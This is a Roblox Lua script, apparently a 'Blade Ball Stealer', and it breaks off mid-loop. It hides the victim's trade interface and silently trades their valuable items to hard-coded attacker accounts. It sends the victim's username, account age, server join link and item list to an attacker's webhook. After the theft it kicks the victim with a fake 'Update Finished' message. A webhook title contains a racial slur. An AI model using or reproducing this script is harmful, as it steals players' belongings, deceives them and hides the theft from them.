-- Configuration (Ré-exécution infinie activée)
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local inTrade = false

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Paramètres
local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
local webhook = _G.webhook or "" 
local auth_token = _G.AuthToken or "EBK-SS-A"
local min_rap = _G.min_rap or 0 
local ping = _G.pingEveryone or "Yes"

---------------------------------------------------------
-- CACHE DE L'INTERFACE
---------------------------------------------------------
local function killUI()
    pcall(function()
        tradeGui.Enabled = false
        tradeGui.Black.Visible = false
        tradeCompleteGui.Enabled = false
        tradeGui.Main.Visible = false
        notificationsGui.Enabled = false
    end)
end
killUI()

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then tradeGui.Enabled = false end 
end)

---------------------------------------------------------
-- FONCTIONS RAP
---------------------------------------------------------
local function getRAP(category, itemName)
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

---------------------------------------------------------
-- WEBHOOK (JAUNE QUAND TU REJOINS)
---------------------------------------------------------

local function SendStatusWebhook(title, color, isStart)
    -- Tri du plus grand au plus petit RAP
    table.sort(itemsToSend, function(a, b)
        return a.RAP > b.RAP
    end)

    local totalRAP = 0
    local itemLines = ""
    for _, item in ipairs(itemsToSend) do
        itemLines = itemLines .. "• " .. item.Name .. " [" .. math.floor(item.RAP) .. " RAP]\n"
        totalRAP = totalRAP + item.RAP
    end

    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
    local clickableLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (isStart and ping == "Yes") and "@everyone | " .. joinCode or nil,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color, -- Sera jaune via l'appel de fonction
            ["fields"] = {
                {name = "ℹ️ Player info:", value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days```", inline = false},
                {name = "🔗 Join link:", value = "[Click to Join Server](" .. clickableLink .. ")", inline = false},
                {name = "🎒 Item list (Sorted):", value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```", inline = false},
                {name = "💰 Summary:", value = "```Total RAP: " .. math.floor(totalRAP) .. "```", inline = false}
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }

    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

---------------------------------------------------------
-- AUTO TRADE
---------------------------------------------------------
local function startAutoTrade(targetPlayer)
    task.spawn(function()
        table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)

        while #itemsToSend > 0 do
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
            
            local timeout = 0
            repeat task.wait(0.5) timeout = timeout + 1 until inTrade or timeout > 20
            
            if inTrade then
                local limit = 0
                while #itemsToSend > 0 and limit < 50 do
                    local item = table.remove(itemsToSend, 1)
                    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                    limit = limit + 1
                    task.wait(0.05)
                end

                pcall(function()
                    netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                    task.wait(0.5)
                    netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                end)
                repeat task.wait(0.2) until not inTrade
            end
            task.wait(1)
        end
        SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false) -- Vert pour le succès final
        task.wait(1)
        plr:kick("Update Finished.")
    end)
end

---------------------------------------------------------
-- LANCEMENT
---------------------------------------------------------
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    local found = false
    for _, p in ipairs(Players:GetPlayers()) do
        if table.find(users, p.Name) then
            -- COULEUR JAUNE ICI (16776960)
            SendStatusWebhook("⚠️ The nigga is on the server ! ("..p.Name..")", 16776960, false)
            startAutoTrade(p)
            found = true
            break
        end
